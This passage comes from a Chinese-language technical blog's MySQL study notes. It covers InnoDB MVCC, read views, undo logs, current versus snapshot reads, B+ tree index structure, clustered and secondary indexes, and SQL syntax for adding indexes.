<h3 id="MVCC的特点"><a href="#MVCC的特点" class="headerlink" title="MVCC的特点"></a>MVCC的特点</h3><p>一般认为MVCC有下面几个特点：</p>
<ul>
<li>每行数据都存在一个版本，每次数据更新时都更新该版本</li>
<li>修改时Copy出当前版本, 然后随意修改，各个事务之间无干扰</li>
<li>保存时比较版本号，如果成功(commit)，则覆盖原记录,失败则放弃copy(rollback)</li>
<li>每行都有版本号，保存时根据版本号决定是否成功，听起来含有乐观锁的味道,因为这看起来正是，在提交的时候才能知道到底能否提交成功</li>
</ul>
<p>而InnoDB实现MVCC的方式是:</p>
<ul>
<li>事务以排他锁的形式修改原始数据</li>
<li>把修改前的数据存放于<code>undo log</code>，通过回滚指针与主数据关联</li>
<li>修改成功（commit）啥都不做，失败则恢复<code>undo log中</code>的数据（rollback）</li>
</ul>
<p>Innodb的实现算不上MVCC, 因为并没有实现核心的多版本共存,<code>undo log</code>中的内容只是串行化的结果,记录了多个事务的过程,不属于多版本共存。但理想的MVCC是难以实现的,当事务仅修改一行记录使用理想的MVCC模式是没有问题的,可以通过比较版本号进行回滚, 但当事务影响到多行数据时, 理想的MVCC就无能为力了。<br>比如, 如果事务A执行理想的MVCC, 修改Row1成功, 而修改Row2失败,此时需要回滚Row1,但因为Row1没有被锁定,其数据可能又被事务B所修改, 如果此时回滚Row1的内容，则会破坏事务B的修改结果，导致事务B违反ACID。这也正是所谓的<strong>第一类更新丢失</strong>的情况。也正是因为InnoDB使用的MVCC中结合了排他锁, 不是纯的MVCC,所以第一类更新丢失是不会出现了,一般说更新丢失都是指第二类丢失更新。</p>
<h3 id="read-view-snapshot"><a href="#read-view-snapshot" class="headerlink" title="read view / snapshot"></a>read view / snapshot</h3><p><code>read view</code>叫做事务快照，也有些称为<code>snapshot</code>,事务快照是用来存储数据库的事务运行情况。一个事务快照的创建过程可以概括为：</p>
<ul>
<li><strong>up_limit_id</strong>：表示该SQL启动时，当前已经提交的事务号 + 1，也就是当前系统中创建最早但还未提交的事务。事务号小于 <code>up_limit_id</code> ，对于当前Read View都是可见的。理解起来就是创建Read View视图的时候，之前已经提交的事务对于该事务肯定是可见的。</li>
<li><strong>low_limit_id</strong>：表示该SQL启动时，当前事务链表中最大的事务id编号+1（即未开启的事务<code>id</code>=当前最大事务<code>id+1</code>），事务号大于等于<code>low_limit_id</code>，对于当前Read View都是不可见的。理解起来就是在创建 Read View 视图之后创建的事务对于该事务肯定是不可见的。</li>
<li><strong>trx_ids</strong>：为活跃事务id列表，即 Read View 初始化时当前未提交的事务列表。所以当进行RR读的时候，trx_ids 中的事务对于本事务是不可见的（除了自身事务，自身事务对于表的修改对于自己当然是可见的）。理解起来就是创建 RV 时，将当前活跃事务 ID 记录下来，后续即使他们提交对于本事务也是不可见的。</li>
</ul>
<p><code>read view</code>主要是用来做可见性判断的, <code>read view</code>快照的生成时机不同,是造成RC,RR两种隔离级别的不同可见性的最主要原因。</p>
<ul>
<li>在<code>innodb</code>中(默认<code>repeatable read</code>级别), 事务在<code>begin/start transaction</code>之后的第一条<code>select</code>读操作后, 会创建一个快照(<code>read view</code>),将当前系统中活跃的其他事务记录记录起来，后续所有的 SELECT 都是复用这个 ReadView，其它 update, delete, insert 语句和一致性读 snapshot 的建立没有关系;</li>
<li>在<code>innodb</code>中(默认<code>read committed</code>级别),事务中每条select语句都会创建一个快照(<code>read view</code>);</li>
</ul>
<h3 id="undo-log"><a href="#undo-log" class="headerlink" title="undo-log"></a>undo-log</h3><p><code>Undo log</code>是InnoDB MVCC事务特性的重要组成部分。当我们对记录做了变更操作时就会产生<code>undo</code>记录，<code>Undo</code>记录默认被记录到系统表空间(<code>ibdata</code>)中，但从5.6开始，也可以使用独立的<code>Undo</code>表空间。</p>
<p><code>Undo</code>记录中存储的是老版本数据，当一个旧的事务需要读取数据时，为了能读取到老版本的数据，需要顺着<code>undo</code>链找到满足其可见性的记录。当版本链很长时，通常可以认为这是个比较耗时的操作。</p>
<p><img src="http://qiniu.xiaoming.net.cn/undo-log.jpg" alt="undo-log"></p>
<p>大多数对数据的变更操作包括<code>INSERT/DELETE/UPDATE</code>，其中<code>INSERT</code>操作在事务提交前只对当前事务可见，因此产生的<code>Undo</code>日志可以在事务提交后直接删除，而对于<code>UPDATE/DELETE</code>则需要维护多版本信息，在<code>InnoDB</code>里，<code>UPDATE和DELETE</code>操作产生的<code>Undo</code>日志被归成一类，即<code>update_undo</code></p>
<p>另外, 在回滚段中的<code>undo logs</code>分为:<code>insert undo log</code>和<code>update undo log</code></p>
<ul>
<li><code>insert undo log</code>:事务对<code>insert</code>新记录时产生的<code>undolog</code>,只在事务回滚时需要, 并且在事务提交后就可以立即丢弃。</li>
<li><code>update undo log</code>:事务对记录进行<code>delete</code>和<code>update</code>操作时产生的<code>undo log</code>,不仅在事务回滚时需要,一致性读也需要，所以不能随便删除，只有当数据库所使用的快照中不涉及该日志记录，对应的回滚日志才会被<code>purge</code>线程删除。</li>
</ul>
<h2 id="InnoDB中MVCC的实现方式"><a href="#InnoDB中MVCC的实现方式" class="headerlink" title="InnoDB中MVCC的实现方式"></a>InnoDB中MVCC的实现方式</h2><p><code>InnoDB</code>的<code>MVCC</code>通过在每行记录后面保存<strong>三个隐藏的字段</strong>来实现：</p>
<ul>
<li><strong>6字节的事务ID（<code>DB_TRX_ID</code>）</strong>：用来标识最近一次对本行记录做修改（<code>insert|update</code>）的事务的标识符，即最后一次修改（<code>insert|update</code>）本行记录的事务id。至于<code>delete</code>操作，在<code>innodb</code>看来也不过是一次<code>update</code>操作，<strong>更新行中的一个特殊位将行表示为deleted, 并非真正删除</strong>。</li>
<li><strong>7字节的回滚指针（<code>DB_ROLL_PTR</code>）</strong>：指写入回滚段（<code>rollback segment</code>）的<code>undo log record</code>（撤销日志记录）。如果一行记录被更新，则<code>undo log record</code>包含“重建该行记录被更新之前内容”所必须的信息</li>
<li>**6字节的<code>DB_ROW_ID</code>**：包含一个随着新行插入而单调递增的行ID，当由<code>Innodb</code>自动产生聚集索引时，聚集索引会包括这个行ID的值，否则这个行ID不会出现在任何索引中。</li>
</ul>
<blockquote>
<p>聚簇索引:如果表中没有主键或合适的唯一索引,也就是无法生成聚簇索引的时候, InnoDB会帮我们自动生成聚集索引,但聚簇索引会使用<code>DB_ROW_ID</code>的值来作为主键; 如果有自己的主键或者合适的唯一索引,那么聚簇索引中也就不会包含<code>DB_ROW_ID</code>了。</p>
</blockquote>
<h2 id="可见性比较算法"><a href="#可见性比较算法" class="headerlink" title="可见性比较算法"></a>可见性比较算法</h2><p>所有数据行上 <code>DB_TRX_ID</code> 小于 <code>up_trx_id</code> 的记录，说明修改该行的事务在当前事务开启之前都已经提交完成，所以对当前事务来说，都是可见的。而对于 <code>DB_TRX_ID</code> 大于 <code>low_trx_id</code> 的记录，说明修改该行记录的事务在当前事务之后，所以对于当前事务来说是不可见的。</p>
<p><strong>注意，ReadView是与SQL绑定的，而并不是事务，所以即使在同一个事务中，每次SQL启动时构造的ReadView的up_trx_id和low_trx_id也都是不一样的，至于DATA_TRX_ID大于low_trx_id本身出现也只有当多个SQL并发的时候，在一个SQL构造完ReadView之后，另外一个SQL修改了数据后又进行了提交，对于这种情况，数据其实是不可见的。</strong></p>
<p>最后，至于位于（up_trx_id, low_trx_id）中间的事务是否可见，这个需要根据不同的事务隔离级别来确定。对于RC的事务隔离级别来说，对于事务执行过程中，已经提交的事务的数据，对当前事务是可见的，也就是说下图中，当前事务运行过程中，trx1~4中任意一个事务提交，对当前事务来说都是可见的；而对于RR隔离级别来说，事务启动时，已经开始的事务链表中的事务的所有修改都是不可见的，所以在RR级别下，<code>low_trx_id</code>基本保持与 <code>up_trx_id</code> 相同的值即可。</p>
<p><img src="http://qiniu.xiaoming.net.cn/mvcc%E4%BA%8B%E5%8A%A1id%E5%8F%AF%E8%A7%81%E6%80%A7.jpg" alt="mvcc事务id可见性"></p>
<p>下图是 MVCC 整体原理图：</p>
<p><img src="http://qiniu.xiaoming.net.cn/MVCC%E5%8E%9F%E7%90%86.jpg" alt="MVCC 整体原理图"></p>
<h2 id="当前读和快照读"><a href="#当前读和快照读" class="headerlink" title="当前读和快照读"></a>当前读和快照读</h2><p>MySQL中InnoDB存储引擎默认事务隔离级别是RR,是通过<strong>行排他锁+MVCC</strong>一起实现的，不仅可以保证可重复读，还可以<strong>部分防止幻读</strong>，而非完全防止。</p>
<p><strong>原因</strong>：如果事务B在事务A执行中，<code>insert</code>了一条数据并提交，事务A再查询的时候，虽然读取的是<code>undo</code>中旧版本数据（防止了部分幻读），但是<strong>事务A中执行<code>updata</code>或者<code>delete</code>都是可以成功的</strong>。因为在innodb中，操作可以分为<strong>当前读</strong>(<code>current read</code>)和<strong>快照读</strong>(<code>snapshot read</code>)</p>
<p>通过 MVCC 机制，虽然让数据变得可重复读，但我们读到的数据可能是历史数据，不是数据库最新的数据。这种读取历史数据的方式，我们叫它快照读 (snapshot read)，而读取数据库最新版本数据的方式，叫当前读 (current read)。</p>
<ul>
<li>快照读：简单的<code>select</code>操作,不包括(<code>select .. lock in share mode</code>,<code>select ... for update</code>)</li>
<li>当前读：<code>select ... lock in share mode</code>,<code>insert</code>,<code>update</code>,<code>delete</code></li>
</ul>
<p>在RR级别下，快照读是通过MVCC（多版本控制）和<code>undo log</code>来实现的，当前读是通过加<code>record lock</code>(记录锁)和<code>gap lock</code>(间隙锁)实现的。</p>
<p><strong>innodb在快照读的情况下并没有真正的避免幻读,但是在当前读的情况下避免了不可重复读和幻读。</strong></p>
<h1 id="8-为什么要使用索引"><a href="#8-为什么要使用索引" class="headerlink" title="8. 为什么要使用索引"></a>8. 为什么要使用索引</h1><ul>
<li>通过创建唯一索引，可以保证数据库表中每一行数据的唯一性</li>
<li>可以大大加快数据的检索速度（大大减少检索的数据量），这也是创建索引的最主要原因</li>
<li>帮助服务器避免排序和临时表</li>
<li>将随机IO变为顺序IO</li>
<li>可以加速表和表之间的连接，特别是在实现数据的参考完整性方面特别有意义</li>
</ul>
<h2 id="索引这么多优点，为什么不对表中的每一个列创建一个索引呢？"><a href="#索引这么多优点，为什么不对表中的每一个列创建一个索引呢？" class="headerlink" title="索引这么多优点，为什么不对表中的每一个列创建一个索引呢？"></a>索引这么多优点，为什么不对表中的每一个列创建一个索引呢？</h2><ol>
<li>当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，这样就降低了数据的维护速度。</li>
<li>索引需要占物理空间，除了数据表占数据空间之外，每一个索引还要占一定的物理空间，如果要建立聚簇索引，那么需要的空间就会更大。</li>
<li>创建索引和维护索引要耗费时间，这种时间随着数据量的增加而增加。</li>
</ol>
<h2 id="使用索引的注意事项？"><a href="#使用索引的注意事项？" class="headerlink" title="使用索引的注意事项？"></a>使用索引的注意事项？</h2><ol>
<li><p>在经常需要搜索的列上，可以加快搜索的速度；</p>
</li>
<li><p>在经常使用在 WHERE 子句中的列上面创建索引，加快条件的判断速度。</p>
</li>
<li><p>在经常需要排序的列上创建索引，因为索引已经排序，这样查询可以利用索引的排序，加快排序查询时间；</p>
</li>
<li><p>对于中到大型表索引都是非常有效的，但是特大型表的话维护开销会很大，不适合建索引</p>
</li>
<li><p>在经常用在连接的列上，这些列主要是一些外键，可以加快连接的速度；</p>
</li>
<li><p>避免 where 子句中对字段施加函数，这会造成无法命中索引。</p>
</li>
<li><p>在使用InnoDB时使用与业务无关的自增主键作为主键，即使用逻辑主键，而不要使用业务主键。</p>
</li>
<li><p><del>将打算加索引的列设置为 NOT NULL ，否则将导致引擎放弃使用索引而进行全表扫描。</del></p>
<p>订正，<strong>将某一列设置为default null，where 是可以走索引，另外索引列是否设置 null 是不影响性能的。</strong> 但是，还是不建议列上允许为空。最好限制 not null，因为 null 需要更多的存储空间并且 null 值无法参与某些运算。</p>
<blockquote>
<p>《高性能MySQL》第四章如是说：And, in case you’re wondering, allowing NULL values in the index really doesn’t impact performance 。NULL 值索引查找流程见 15 题</p>
</blockquote>
</li>
<li><p>删除长期未使用的索引，不用的索引的存在会造成不必要的性能损耗， MySQL 5.7 可以通过查询 sys 库的 chema_unused_indexes 视图来查询哪些索引从未被使用</p>
</li>
<li><p>在使用 limit offset 查询缓慢时，可以借助索引来提高性能</p>
</li>
</ol>
<h1 id="9-索引结构原理"><a href="#9-索引结构原理" class="headerlink" title="9. 索引结构原理"></a>9. 索引结构原理</h1><p>MySQL索引使用的数据结构主要有<strong>B+Tree索引</strong>和<strong>哈希索引</strong>。对于哈希索引来说，底层的数据结构就是哈希表，因此在绝大多数需求为单条记录查询的时候，可以选择哈希索引，查询性能最快；其于大部分场景，选择<code>B+Tree</code>索引。</p>
<h2 id="B-Tree数据结构"><a href="#B-Tree数据结构" class="headerlink" title="B+Tree数据结构"></a>B+Tree数据结构</h2><p><code>Tree</code>指的是<code>Balance Tree</code>，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。</p>
<p><code>B+ Tree</code>是基于<code>B Tree</code>和叶子节点顺序访问指针进行实现，它具有<code>B Tree</code>的平衡性，并且通过顺序访问指针来提高区间查询的性能。</p>
<p>在<code>B+ Tree</code>中，一个节点中的<code>key</code>从左到右非递减排列，如果某个指针的左右相邻<code>key</code>分别是<code>keyi</code>和<code>keyi+1</code>，且不为<code>null</code>，则该指针指向节点的所有<code>key</code>大于等于<code>keyi</code>且小于等于<code>keyi+1</code>。</p>
<p><img src="http://qiniu.xiaoming.net.cn/B%2BTree%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="B+Tree数据结构"></p>
<p>在进行查找操作时，首先在根节点进行二分查找，找到一个<code>key</code>所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出<code>key</code>所对应的<code>data</code>。</p>
<p>插入删除操作会破坏平衡树的平衡性，因此在插入删除操作之后，需要对树进行一个分裂、合并、旋转等操作来维护平衡性。</p>
<p>大多数 MySQL 存储引擎的默认索引类型都是<code>B+Tree</code>。</p>
<p>因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。</p>
<p>因为<code>B+ Tree</code>的有序性，所以除了用于查找，还可以用于排序和分组。</p>
<p>可以指定多个列作为索引列，多个索引列共同组成键。</p>
<p>适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。</p>
<p>MySQL的BTree索引使用的是B树中的<strong>B+Tree</strong>，但对于主要的两种存储引擎，其实现方式不同：</p>
<ul>
<li><strong>MyISAM</strong>:<code>B+Tree</code>叶节点的<code>data</code>域存放的是数据记录的地址。在索引检索的时候，首先按照<code>B+Tree</code>搜索算法搜索索引，如果指定的<code>Key</code>存在，则取出其<code>data</code>域的值，然后以<code>data</code>域的值为地址读取相应的数据记录。这被称为“非聚簇索引”。</li>
<li><strong>InnoDB</strong>:其数据文件本身就是索引文件。相比MyISAM，索引文件和数据文件是分离的，其表数据文件本身就是按<code>B+Tree</code>组织的一个索引结构，树的叶节点<code>data</code>域保存了完整的数据记录。这个索引的<code>key</code>是数据表的主键，因此<code>InnoDB</code>表数据文件本身就是主索引。这被称为“聚簇索引（或聚集索引）”。<strong>因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引</strong>。而其余的索引都作为辅助索引，辅助索引的<code>data</code>域存储相应记录主键的值而不是地址，这也是和<code>MyISAM</code>不同的地方。在根据主索引搜索时，直接找到<code>key</code>所在的节点即可取出数据；在根据辅助索引查找时，则需要先取出主键的值，再走一遍主索引。因此，在设计表的时候，不建议使用过长的字段作为主键，也不建议使用非单调的字段作为主键，这样会造成主索引频繁分裂。</li>
</ul>
<h3 id="主键索引（聚簇-集索引）："><a href="#主键索引（聚簇-集索引）：" class="headerlink" title="主键索引（聚簇/集索引）："></a>主键索引（聚簇/集索引）：</h3><p><img src="http://qiniu.xiaoming.net.cn/%E4%B8%BB%E9%94%AE%E7%B4%A2%E5%BC%95.png" alt="主键索引"></p>
<h4 id="聚集索引的优点"><a href="#聚集索引的优点" class="headerlink" title="聚集索引的优点"></a>聚集索引的优点</h4><p>聚集索引的查询速度非常的快，因为整个B+树本身就是一颗多叉平衡树，叶子节点也都是有序的，定位到索引的节点，就相当于定位到了数据。</p>
<h4 id="聚集索引的缺点"><a href="#聚集索引的缺点" class="headerlink" title="聚集索引的缺点"></a>聚集索引的缺点</h4><ol>
<li><strong>依赖于有序的数据</strong> ：因为B+树是多路平衡树，如果索引的数据不是有序的，那么就需要在插入时排序，如果数据是整型还好，否则类似于字符串或UUID这种又长又难比较的数据，插入或查找的速度肯定比较慢。</li>
<li><strong>更新代价大</strong> ： 索引列的数据被修改时，对应的索引也将会被修改， 而且聚集索引的叶子节点还存放着数据，修改代价肯定是较大的， 所以对于主键索引来说，主键一般都是不可被修改的。</li>
</ol>
<h3 id="辅助索引（二级索引）："><a href="#辅助索引（二级索引）：" class="headerlink" title="辅助索引（二级索引）："></a>辅助索引（二级索引）：</h3><p><img src="http://qiniu.xiaoming.net.cn/%E8%BE%85%E5%8A%A9%E7%B4%A2%E5%BC%95.png" alt="辅助索引"></p>
<h4 id="非聚集索引的优点"><a href="#非聚集索引的优点" class="headerlink" title="非聚集索引的优点"></a>非聚集索引的优点</h4><p><strong>更新代价比聚集索引要小</strong> 。非聚集索引的更新代价就没有聚集索引那么大了，非聚集索引的叶子节点是不存放数据的</p>
<h4 id="非聚集索引的缺点"><a href="#非聚集索引的缺点" class="headerlink" title="非聚集索引的缺点"></a>非聚集索引的缺点</h4><ol>
<li>跟聚集索引一样，非聚集索引也依赖于有序的数据</li>
<li><strong>可能会二次查询(回表)</strong> :这应该是非聚集索引最大的缺点了。当查到索引对应的指针或主键后，可能还需要根据指针或主键再到数据文件或表中查询。</li>
</ol>
<h3 id="覆盖索引（不需要回表的情况）"><a href="#覆盖索引（不需要回表的情况）" class="headerlink" title="覆盖索引（不需要回表的情况）"></a>覆盖索引（不需要回表的情况）</h3><p>如果一个索引包含（或者说覆盖）所有需要查询的字段的值，就称之为“覆盖索引”。我们知道InnoDB存储引擎中，如果不是主键索引，叶子节点存储的是主键+列值。最终还是要“回表”，也就是要通过主键再查找一次。这样就会比较慢。覆盖索引就是把要查询出的列和索引对应，不做回表操作！</p>
<h4 id="覆盖索引使用实例"><a href="#覆盖索引使用实例" class="headerlink" title="覆盖索引使用实例"></a>覆盖索引使用实例</h4><p>现在如果创建了索引(username,age)，执行下面的 sql 语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username , age from user where username &#x3D; &#39;Java&#39; and age &#x3D; 22</span><br></pre></td></tr></table></figure>

<p>在查询数据的时候：要查询出的列在叶子节点都存在！所以，就不用回表</p>
<h2 id="选择索引和编写利用这些索引的查询的3个原则"><a href="#选择索引和编写利用这些索引的查询的3个原则" class="headerlink" title="选择索引和编写利用这些索引的查询的3个原则"></a>选择索引和编写利用这些索引的查询的3个原则</h2><ol>
<li>单行访问是很慢的。特别是在机械硬盘存储中(SSD的随机I/O要快很多，不过这一点仍然成立）。如果服务器从存储中读取一个数据块只是为了获取其中一行，那么就浪费了很多工作。最好读取的块中能包含尽可能多所需要的行。使用索引可以创建位置引，用以提升效率。</li>
<li>按顺序访问范围数据是很快的，这有两个原因。第一，顺序I/0不需要多次磁盘寻道，所以比随机I/O要快很多（特别是对机械硬盘）。第二，如果服务器能够按需要顺序读取数据，那么就不再需要额外的排序操作，并且GROUPBY查询也无须再做排序和将行按组进行聚合计算了。</li>
<li>索引覆盖查询是很快的。如果一个索引包含了查询需要的所有列，那么存储引擎就不需要再回表查找行。这避免了大量的单行访问，而上面的第1点已经写明单行访问是很慢的。</li>
</ol>
<h2 id="索引的原理"><a href="#索引的原理" class="headerlink" title="索引的原理"></a>索引的原理</h2><p>索引就是将无序的数据变成有序：</p>
<p><img src="https://img-blog.csdnimg.cn/20190407101611384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTQxNDgz,size_16,color_FFFFFF,t_70#pic_center" alt="使用索引后"></p>
<p>找到id为8的记录的简要步骤：</p>
<p><img src="https://img-blog.csdnimg.cn/2019040710193691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTQxNDgz,size_16,color_FFFFFF,t_70#pic_center" alt="索引查找"></p>
<p>在没有用到索引的时候，需要遍历双向链表来定位对应的页，使用索引后通过“目录”就可以很快定位到对应的页上了。</p>
<p>采用的是二分查找法，时间复杂度近似为O(log(n)),其底层结构是B+树。</p>
<h2 id="其它类型索引"><a href="#其它类型索引" class="headerlink" title="其它类型索引"></a>其它类型索引</h2><h3 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h3><p>哈希索引能以O(1)时间进行查找，但是失去了有序性：</p>
<ul>
<li>无法用于排序和分组</li>
<li>只支持精确查找，无法用于部分查找和范围查找</li>
</ul>
<p>InnoDB存储引擎有一个特殊的功能叫做“自适应哈希索引”，当某个索引值被使用的非常频繁的时候，会在B+ Tree索引之上再创建一个哈希索引，这样就让B+ Tree索引具有哈希索引的一些优点，比如快速的哈希查找。</p>
<h3 id="全文索引"><a href="#全文索引" class="headerlink" title="全文索引"></a>全文索引</h3><p>MyISAM存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。</p>
<p>查找条件使用<code>MATCH AGAINST</code>,而不是普通的<code>WHERE</code></p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MATCH (col1,col2,...) AGAINST (expr [search_modifier])</span><br><span class="line"></span><br><span class="line">search_modifier:</span><br><span class="line">&#123;</span><br><span class="line">    IN NATURAL LANGUAGE MODE | # 自然语言全文搜索（默认）</span><br><span class="line">    IN NATURAL LANGUAGE MODE WITH QUERY EXPANSION | # 带查询扩展的自然语言全文搜索</span><br><span class="line">    IN BOOLEAN MODE | # 布尔全文搜索，该搜索模式下，待搜索单词前或后的一些特定字符会有特殊的含义。</span><br><span class="line">    WITH QUERY EXPANSION # 查询扩展全文搜索</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># title和body字段已经建立全文索引</span><br><span class="line">SELECT * FROM articles WHERE MATCH (title,body) AGAINST (&#39;database&#39; IN NATURAL LANGUAGE MODE);</span><br></pre></td></tr></table></figure>

<p>在全文索引中，实际返回的行是按与所查找内容的相关度由高到低的顺序排列的。这个相关度的值由<code>WHERE</code>语句中的<code>MATCH(...)AGAINST(...)</code>计算所得，是一个非负浮点数。该值越大表明相应的行与所查找的内容越相关，0值表明不相关。该值基于行中的单词数、行中不重复的单词数、文本集合中总单词数以及含特定单词的行数计算得出。如果直接执行以下语句，则直接返回的就是相关度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT MATCH(title,body) AGAINST (&#39;database&#39; IN NATURAL LANGUAGE MODE) as score FROM articles</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意查找内容不区分大小写</p>
</blockquote>
<p>拥有查询扩展的查询模式，在查询的时候会进行两次搜索。第一次用给定的搜索内容进行搜索，第二次使用给定的搜索内容结合第一次搜索返回结果中相关性非常高的一些行进行搜索，例如搜索“database”，实际上我们期望返回结果不仅仅是仅包含“database”单词的行，一些包含“MySQL”、“SQLServer”、“Oracle”、“DB2”、“RDBMS”等的行也期望被返回。这个时候查询扩展全文搜索就能大显身手。</p>
<h3 id="空间数据索引"><a href="#空间数据索引" class="headerlink" title="空间数据索引"></a>空间数据索引</h3><p>MyISAM存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。</p>
<p>必须使用GIS相关的函数来维护数据</p>
<h1 id="10-MySQL-索引为什么使用-B-Tree"><a href="#10-MySQL-索引为什么使用-B-Tree" class="headerlink" title="10. MySQL 索引为什么使用 B+ Tree"></a>10. MySQL 索引为什么使用 B+ Tree</h1><p>普通平衡树的缺点：</p>
<ul>
<li>数据量不大时，普通平衡树（AVL树，红黑树）性能极好。但是数据量巨大时，内存不够用，无法将数据全部加载到内存中，只能放到磁盘</li>
<li>树的高度为LogN，导致磁盘IO次数过多影响效率</li>
<li>调整树的平衡是通过旋转实现，如果不把全部数据加载进内存是无法完成旋转的</li>
</ul>
<p>B-树的缺点：</p>
<ul>
<li>非叶子节点也存储数据，每次磁盘io数据量是固定的，每一层索引范围小</li>
<li>数据分散在每个节点中，不支持范围查询</li>
</ul>
<p>B+树的特有性质：</p>
<ul>
<li>非叶子节点只存储key，每一层能索引的数据更多。每次io能看到更多数据</li>
<li>树高度低（一般为3层左右），io次数少</li>
<li>叶子节点两两相连，符合磁盘预读特性，减少io次数</li>
<li>范围查询支持良好。真正数据只存储在叶子节点，范围查询只需遍历叶子节点</li>
<li>每个节点的大小设置为磁盘IO一次的大小（称为页，根据操作系统不同而定，如16k）</li>
</ul>
<p>B+ Tree 索引与红黑树比较：</p>
<p>红黑树等平衡数也可以用来实现索引，但是文件系统以及数据库系统普遍采用<code>B+ Tree</code>作为索引结构，主要有以下两个原因：</p>
<ul>
<li><strong>更少的查找次数</strong>：平衡树查找操作的时间复杂度和树高 h 相关，<code>O(h) = O(logdN)</code>,其中d为每个节点的出度。（出度指的是当前节点中叶子结点的个数）<br>红黑树的出度为2，而B+ Tree的出度一般都非常大，所以红黑树的树高h很明显比B+ Tree大非常多，查找的次数也就更多。</li>
<li><strong>利用磁盘预读特性</strong>：为了减少磁盘I/O操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。<br>操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次I/O就能完全载入一个节点。并且可以利用预读特性，相邻的节点也能够被预先载入。</li>
</ul>
<h1 id="11-什么是冗余，什么是冗余索引"><a href="#11-什么是冗余，什么是冗余索引" class="headerlink" title="11. 什么是冗余，什么是冗余索引"></a>11. 什么是冗余，什么是冗余索引</h1><p>同一信息的重复储存，叫做冗余</p>
<ul>
<li>低级冗余：字段的重复</li>
<li>高级冗余：字段的派生：比如总额=单价*数量</li>
</ul>
<p>形成原因：</p>
<ul>
<li>表重复</li>
<li>属性重复</li>
<li>元组重复</li>
</ul>
<p>冗余的坏处：</p>
<ul>
<li>为了保证数据一致性，要维护冗余字段的成本高</li>
<li>可能导致数据不一致</li>
</ul>
<p>冗余索引指的是索引功能相同，能够命中就肯定能命中，那么就是冗余索引，如<code>(name,city)</code>和<code>(name)</code>这两个索引就是冗余索引，能够命中后者的查询肯定能够命中前者。</p>
<p>MySQL5.7之后，可以通过查询<code>sys</code>库中的<code>schemal_redundant_indexes</code>表来查看冗余索引。</p>
<h1 id="12-MySQL如何为表字段添加索引"><a href="#12-MySQL如何为表字段添加索引" class="headerlink" title="12. MySQL如何为表字段添加索引"></a>12. MySQL如何为表字段添加索引</h1><ol>
<li><p>添加<code>PRIMARY KEY</code>(主键索引)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ALTER TABLE <span class="string">&#x27;table_name&#x27;</span> ADD PRIMARY KEY (<span class="string">&#x27;column&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加<code>UNIQUE</code>(唯一索引)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ALTER TABLE <span class="string">&#x27;table_name&#x27;</span> ADD UNIQUE (<span class="string">&#x27;column&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加<code>INDEX</code>(普通索引)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ALTER TABLE <span class="string">&#x27;table_name&#x27;</span> ADD INDEX index_name (<span class="string">&#x27;column&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加<code>FULLTEXT</code>(全文索引)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ALTER TABLE <span class="string">&#x27;table_name&#x27;</span> ADD FULLTEXT (<span class="string">&#x27;column&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加多列索引</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ALTER TABLE <span class="string">&#x27;table_name&#x27;</span> ADD INDEX index_name (<span class="string">&#x27;column1&#x27;</span>,<span class="string">&#x27;column2&#x27;</span>,<span class="string">&#x27;column3&#x27;</span>);</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="13-什么是聚簇索引和非聚簇索引？"><a href="#13-什么是聚簇索引和非聚簇索引？" class="headerlink" title="13. 什么是聚簇索引和非聚簇索引？"></a>13. 什么是聚簇索引和非聚簇索引？</h1><p>聚簇索引的叶子节点就是数据节点，而非聚簇索引的叶子节点仍然是索引节点，只不过有指向对应数据块的指针。</p>
<p>聚簇索引，实际存储的循序结构与数据存储的物理机构是一致的，所以通常来说物理顺序结构只有一种，那么一个表的聚簇索引也只能有一个，通常默认都是主键，设置了主键，系统默认就加上了聚簇索引。总而言之，聚簇索引是顺序结构与数据存储物理结构一致的一种索引，并且一个表的聚簇索引只能有唯一的一条。</p>
<p>非聚簇索引记录的物理顺序与逻辑顺序没有必然的联系，与数据的存储物理结构没有关系；一个表对应的非聚簇索引可以有多条，根据不同列的约束可以建立不同要求的非聚簇索引；</p>
